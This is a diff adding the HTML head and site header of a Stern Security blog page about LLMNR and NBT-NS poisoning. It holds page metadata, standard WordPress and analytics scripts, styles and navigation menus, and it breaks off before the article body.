@@ -1,0 +1,1175 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v16.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Local Network Attacks: LLMNR and NBT-NS Poisoning - Stern Security</title>
+	<link rel="canonical" href="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Local Network Attacks: LLMNR and NBT-NS Poisoning - Stern Security" />
+	<meta property="og:description" content="Background How can an attacker capture usernames and passwords on a local network by simply waiting for the computers to willingly give them up? &nbsp;LLMNR and NBT-NS poisoning! Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines. &nbsp;LLLMNR was introduced in Windows Vista and is the successor [&hellip;]" />
+	<meta property="og:url" content="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/" />
+	<meta property="og:site_name" content="Stern Security" />
+	<meta property="article:published_time" content="2013-11-16T00:00:00+00:00" />
+	<meta property="article:modified_time" content="2021-03-23T12:06:58+00:00" />
+	<meta property="og:image" content="https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg" />
+	<meta property="og:image:width" content="782" />
+	<meta property="og:image:height" content="782" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:label1" content="Written by">
+	<meta name="twitter:data1" content="Webmaster">
+	<meta name="twitter:label2" content="Est. reading time">
+	<meta name="twitter:data2" content="7 minutes">
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://www.sternsecurity.com/#website","url":"https://www.sternsecurity.com/","name":"Stern Security","description":"Cyber Security company dedicated to customer service and improving the long-term security posture of organizations","potentialAction":[{"@type":"SearchAction","target":"https://www.sternsecurity.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#primaryimage","inLanguage":"en-US","url":"https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg","contentUrl":"https://www.sternsecurity.com/wp-content/uploads/2020/11/28b8f12309e9ac4afaade20e5d04ffc2_L.jpg","width":782,"height":782},{"@type":"WebPage","@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#webpage","url":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/","name":"Local Network Attacks: LLMNR and NBT-NS Poisoning - Stern Security","isPartOf":{"@id":"https://www.sternsecurity.com/#website"},"primaryImageOfPage":{"@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#primaryimage"},"datePublished":"2013-11-16T00:00:00+00:00","dateModified":"2021-03-23T12:06:58+00:00","author":{"@id":"https://www.sternsecurity.com/#/schema/person/48712a5ce5d90c9b097ee5667ef84263"},"breadcrumb":{"@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/"]}]},{"@type":"BreadcrumbList","@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://www.sternsecurity.com/","url":"https://www.sternsecurity.com/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://www.sternsecurity.com/blog/","url":"https://www.sternsecurity.com/blog/","name":"Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/#webpage"}}]},{"@type":"Person","@id":"https://www.sternsecurity.com/#/schema/person/48712a5ce5d90c9b097ee5667ef84263","name":"Webmaster","image":{"@type":"ImageObject","@id":"https://www.sternsecurity.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/c4adff83e77902e2f6910394f60d33fb?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/c4adff83e77902e2f6910394f60d33fb?s=96&d=mm&r=g","caption":"Webmaster"},"sameAs":["http://sternsecurity.wpengine.com"],"url":"https://www.sternsecurity.com/blog/author/sternsecurity/"}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//www.sternsecurity.com' />
+<link rel='dns-prefetch' href='//fonts.googleapis.com' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link href='https://fonts.gstatic.com' crossorigin rel='preconnect' />
+<link rel="alternate" type="application/rss+xml" title="Stern Security &raquo; Feed" href="https://www.sternsecurity.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Stern Security &raquo; Comments Feed" href="https://www.sternsecurity.com/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Stern Security &raquo; Local Network Attacks: LLMNR and NBT-NS Poisoning Comments Feed" href="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.sternsecurity.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://www.sternsecurity.com/wp-includes/css/dist/block-library/style.min.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://www.sternsecurity.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.1' type='text/css' media='all' />
+<link rel='stylesheet' id='rs-plugin-settings-css'  href='https://www.sternsecurity.com/wp-content/plugins/revslider/public/assets/css/rs6.css?ver=6.3.1' type='text/css' media='all' />
+<style id='rs-plugin-settings-inline-css' type='text/css'>
+#rs-demo-id {}
+</style>
+<link rel='stylesheet' id='engitech-fonts-css'  href='https://fonts.googleapis.com/css?family=Montserrat%3A100%2C100i%2C200%2C200i%2C300%2C300i%2C400%2C400i%2C500%2C500i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i%7CNunito+Sans%3A200%2C200i%2C300%2C300i%2C400%2C400i%2C600%2C600i%2C700%2C700i%2C800%2C800i%2C900%2C900i&#038;subset=latin%2Clatin-ext' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/bootstrap.css?ver=4.0' type='text/css' media='all' />
+<link rel='stylesheet' id='engitech-awesome-font-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/font-awesome.min.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='engitech-flaticon-font-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/flaticon.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='slick-slider-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/slick.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='slick-theme-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/slick-theme.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='magnific-popup-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/magnific-popup.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='engitech-style-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech-child/style.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='simple-likes-public-css-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/inc/backend/css/simple-likes-public.css?ver=5.7.2' type='text/css' media='all' />
+<link rel='stylesheet' id='engitech-preload-css'  href='https://www.sternsecurity.com/wp-content/themes/engitech/css/royal-preload.css?ver=5.7.2' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/stop-user-enumeration/frontend/js/frontend.js?ver=1.3.29' id='stop-user-enumeration-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/revslider/public/assets/js/rbtools.min.js?ver=6.3.1' id='tp-tools-js'></script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/plugins/revslider/public/assets/js/rs6.min.js?ver=6.3.1' id='revmin-js'></script>
+<script type='text/javascript' id='simple-likes-public-js-js-extra'>
+/* <![CDATA[ */
+var simpleLikes = {"ajaxurl":"https:\/\/www.sternsecurity.com\/wp-admin\/admin-ajax.php","like":"Like","unlike":"Unlike"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.sternsecurity.com/wp-content/themes/engitech/inc/backend/js/simple-likes-public.js?ver=0.5' id='simple-likes-public-js-js'></script>
+<link rel="https://api.w.org/" href="https://www.sternsecurity.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.sternsecurity.com/wp-json/wp/v2/posts/2970" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.sternsecurity.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.sternsecurity.com/wp-includes/wlwmanifest.xml" /> 
+<link rel='shortlink' href='https://www.sternsecurity.com/?p=2970' />
+<link rel="alternate" type="application/json+oembed" href="https://www.sternsecurity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.sternsecurity.com%2Fblog%2Flocal-network-attacks-llmnr-and-nbt-ns-poisoning%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.sternsecurity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.sternsecurity.com%2Fblog%2Flocal-network-attacks-llmnr-and-nbt-ns-poisoning%2F&#038;format=xml" />
+
+		<!-- GA Google Analytics @ https://m0n.co/ga -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-77JQ8K2XXP"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+			gtag('config', 'G-77JQ8K2XXP');
+		</script>
+
+	<link rel="pingback" href="https://www.sternsecurity.com/xmlrpc.php">        <script>
+                    </script>
+    <meta name="generator" content="Powered by Slider Revolution 6.3.1 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+<link rel="icon" href="https://www.sternsecurity.com/wp-content/uploads/2020/12/Stern-Favicon-small-150x150.png" sizes="32x32" />
+<link rel="icon" href="https://www.sternsecurity.com/wp-content/uploads/2020/12/Stern-Favicon-small.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://www.sternsecurity.com/wp-content/uploads/2020/12/Stern-Favicon-small.png" />
+<meta name="msapplication-TileImage" content="https://www.sternsecurity.com/wp-content/uploads/2020/12/Stern-Favicon-small.png" />
+<script type="text/javascript">function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {				 
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;	
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;	
+				try {								
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);		
+					if(e.layout==="fullscreen" || e.l==="fullscreen") 						
+						newh = Math.max(e.mh,window.RSIH);					
+					else{					
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];					
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+											
+						var nl = new Array(e.rl.length),
+							ix = 0,						
+							sl;					
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;					
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];									
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}															
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);					
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}				
+					if(window.rs_init_css===undefined) window.rs_init_css = document.head.appendChild(document.createElement("style"));					
+					document.getElementById(e.c).height = newh+"px";
+					window.rs_init_css.innerHTML += "#"+e.c+"_wrapper { height: "+newh+"px }";				
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}					   
+			//});
+		  };</script>
+		<style type="text/css" id="wp-custom-css">
+			footer .contact-info p a {
+	color: #fff;
+}
+
+header .top-rht-hdr-tel a {
+	color: #7141b1;
+}
+
+footer .contact-info p a:hover,
+header .top-rht-hdr-tel a:hover{
+	color: #43baff;
+}
+
+.has-subnav-special > a {
+	cursor: default;
+}
+
+#comments {
+	display: none;
+}
+
+#footer-menu.footer-menu ul.menu li {
+	margin: 0 15px;
+}
+#footer-menu.footer-menu ul.menu li.current-menu-item a {
+	color: #43baff;
+}
+
+body.single.single-post .entry-summary figure:first-child {
+	display: none;
+}		</style>
+		<style id="kirki-inline-styles">.page-header{background-image:url("https://www.sternsecurity.com/wp-content/themes/engitech/images/bg-pheader.jpg");}#royal_preloader.royal_preloader_logo .royal_preloader_percentage{font-family:Roboto;font-size:13px;font-weight:400;letter-spacing:2px;line-height:40px;text-align:center;text-transform:none;}@media (max-width: 767px){}@media (min-width: 768px) and (max-width: 1024px){}@media (min-width: 1024px){}/* cyrillic-ext */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu72xMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+0460-052F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F;
+}
+/* cyrillic */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu5mxMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+0400-045F, U+0490-0491, U+04B0-04B1, U+2116;
+}
+/* greek-ext */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7mxMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+1F00-1FFF;
+}
+/* greek */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4WxMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+0370-03FF;
+}
+/* vietnamese */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7WxMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+0102-0103, U+0110-0111, U+0128-0129, U+0168-0169, U+01A0-01A1, U+01AF-01B0, U+1EA0-1EF9, U+20AB;
+}
+/* latin-ext */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu7GxMKTU1Kvnz.woff) format('woff');
+  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+}
+/* latin */
+@font-face {
+  font-family: 'Roboto';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://www.sternsecurity.com/wp-content/fonts/roboto/KFOmCnqEu92Fr1Mu4mxMKTU1Kg.woff) format('woff');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+}</style></head>
+
+<body class="post-template-default single single-post postid-2970 single-format-standard royal_preloader elementor-default elementor-kit-2894 engitech-theme-ver-1.1.1 wordpress-version-5.7.2">
+<div id="royal_preloader" data-width="175" data-height="90" data-url="http://sternsecurity.wpengine.com/wp-content/uploads/2020/09/Stern-Logo-for-Header-small.png" data-color="#0a0f2b" data-bgcolor="#fff"></div><div id="page" class="site">
+	<!-- #site-header-open -->
+<header id="site-header" class="site-header header-static">
+
+    <!-- #header-desktop-open -->
+    <div class="header-desktop">		<div data-elementor-type="wp-post" data-elementor-id="2843" class="elementor elementor-2843" data-elementor-settings="[]">
+						<div class="elementor-inner">
+							<div class="elementor-section-wrap">
+							<section class="elementor-section elementor-top-section elementor-element elementor-element-f515cb0 elementor-section-content-middle elementor-section-full_width ot-traditional elementor-section-height-default elementor-section-height-default" data-id="f515cb0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2416e109 ot-column-items-center ot-flex-column-vertical" data-id="2416e109" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2081dfd7 elementor-icon-list--layout-inline elementor-align-left elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="2081dfd7" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items elementor-inline-items">
+							<li class="elementor-icon-list-item elementor-inline-item">
+					<a href="tel:9198867685">						<span class="elementor-icon-list-icon">
+							<i aria-hidden="true" class="fas fa-phone-alt"></i>						</span>
+										<span class="elementor-icon-list-text">919.886.7685</span>
+											</a>
+									</li>
+						</ul>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3346d93d ot-flex-column-horizontal" data-id="3346d93d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-11e4f792 elementor-widget elementor-widget-text-editor" data-id="11e4f792" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+								<div class="elementor-text-editor elementor-clearfix">
+					<p><span data-bind="marked: {value: item.body, useMarkdown: item.contentType() == 'TEXT', collapseQuotes: true, openExternalLinksInNewTab: true}">We&#8217;re looking forward to working with you!</span> <span style="color: #43baff;"><a style="color: #43baff;" href="https://www.sternsecurity.com/contact/"><span data-bind="marked: {value: item.body, useMarkdown: item.contentType() == 'TEXT', collapseQuotes: true, openExternalLinksInNewTab: true}">Contact Us</span></a></span></p>					</div>
+						</div>
+				</div>
+				<div class="elementor-element elementor-element-31437729 elementor-shape-square elementor-grid-5 e-grid-align-right elementor-widget elementor-widget-social-icons" data-id="31437729" data-element_type="widget" data-widget_type="social-icons.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-social-icons-wrapper elementor-grid">
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter elementor-repeater-item-4bf2890" href="https://twitter.com/stern_security" target="_blank">
+						<span class="elementor-screen-only">Twitter</span>
+						<i class="fab fa-twitter"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-linkedin-in elementor-repeater-item-e6c93ca" href="https://www.linkedin.com/company/sternsecurity" target="_blank">
+						<span class="elementor-screen-only">Linkedin-in</span>
+						<i class="fab fa-linkedin-in"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram elementor-repeater-item-3ffc2fd" href="https://www.instagram.com/sternsec/" target="_blank">
+						<span class="elementor-screen-only">Instagram</span>
+						<i class="fab fa-instagram"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook elementor-repeater-item-7b1c211" href="https://www.facebook.com/sternsec" target="_blank">
+						<span class="elementor-screen-only">Facebook</span>
+						<i class="fab fa-facebook"></i>					</a>
+				</div>
+							<div class="elementor-grid-item">
+					<a class="elementor-icon elementor-social-icon elementor-social-icon-vimeo elementor-repeater-item-a29f1a7" href="https://vimeo.com/sternsecurity" target="_blank">
+						<span class="elementor-screen-only">Vimeo</span>
+						<i class="fab fa-vimeo"></i>					</a>
+				</div>
+					</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-755e8132 elementor-section-full_width is-fixed ot-traditional elementor-section-height-default elementor-section-height-default" data-id="755e8132" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-extended">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-62c5fc44 ot-column-items-center ot-flex-column-vertical" data-id="62c5fc44" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-60d53692 elementor-widget elementor-widget-ilogo" data-id="60d53692" data-element_type="widget" data-widget_type="ilogo.default">
+				<div class="elementor-widget-container">
+						
+	    	<div class="the-logo">
+				<a href="https://www.sternsecurity.com/">
+					<img src="https://sternsecurity.wpengine.com/wp-content/uploads/2020/09/Stern-Logo-for-Header-small.png" alt="Stern Security">
+				</a>			        
+		    </div>
+		    
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-224525d5 ot-flex-column-vertical" data-id="224525d5" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-2ff5b4f4 elementor-widget elementor-widget-imenu" data-id="2ff5b4f4" data-element_type="widget" data-widget_type="imenu.default">
+				<div class="elementor-widget-container">
+						<nav id="site-navigation" class="main-navigation ">			
+				<ul id="primary-menu" class="menu"><li id="menu-item-2978" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-2978"><a href="https://www.sternsecurity.com/">Home</a></li>
+<li id="menu-item-2994" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-2994"><a href="https://www.sternsecurity.com/services/">Cybersecurity Services</a>
+<ul class="sub-menu">
+	<li id="menu-item-3286" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3286"><a href="https://www.sternsecurity.com/blog/portfolio/velocity/">Security Posture</a></li>
+	<li id="menu-item-3287" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3287"><a href="https://www.sternsecurity.com/blog/portfolio/penetration-testing/">Penetration Testing</a></li>
+	<li id="menu-item-3288" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3288"><a href="https://www.sternsecurity.com/blog/portfolio/data-security-consulting/">Data Security Consulting</a></li>
+	<li id="menu-item-3289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3289"><a href="https://www.sternsecurity.com/blog/portfolio/virtual-security-officer/">Virtual Security Officer</a></li>
+</ul>
+</li>
+<li id="menu-item-3370" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3370"><a href="#">Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-3369" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3369"><a href="https://www.sternsecurity.com/about-us/">About Us</a></li>
+	<li id="menu-item-3371" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3371"><a href="https://www.sternsecurity.com/careers/">Careers</a></li>
+</ul>
+</li>
+<li id="menu-item-3368" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3368"><a href="#">Latest News &#038; Blog</a>
+<ul class="sub-menu">
+	<li id="menu-item-2982" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-2982"><a href="https://www.sternsecurity.com/blog/">Blog</a></li>
+	<li id="menu-item-3006" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3006"><a href="https://www.sternsecurity.com/in-the-news/">In The News</a></li>
+	<li id="menu-item-3024" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3024"><a href="https://www.sternsecurity.com/publications/">Publications</a></li>
+</ul>
+</li>
+<li id="menu-item-3078" class="has-subnav-special menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-3078"><a href="#">Tools</a>
+<ul class="sub-menu">
+	<li id="menu-item-3003" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3003"><a target="_blank" rel="noopener" href="https://www.healthcarebreaches.com/">Healthcare Breach Analysis</a></li>
+	<li id="menu-item-3004" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3004"><a target="_blank" rel="noopener" href="https://github.com/sternsecurity/">GitHub</a></li>
+</ul>
+</li>
+<li id="menu-item-2983" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2983"><a href="https://www.sternsecurity.com/contact/">Contact</a></li>
+</ul>			</nav>
+	    		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-1534b56a ot-flex-column-horizontal hidden-1200" data-id="1534b56a" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-22d1ee74 elementor-widget elementor-widget-isearch" data-id="22d1ee74" data-element_type="widget" data-widget_type="isearch.default">
+				<div class="elementor-widget-container">
+						
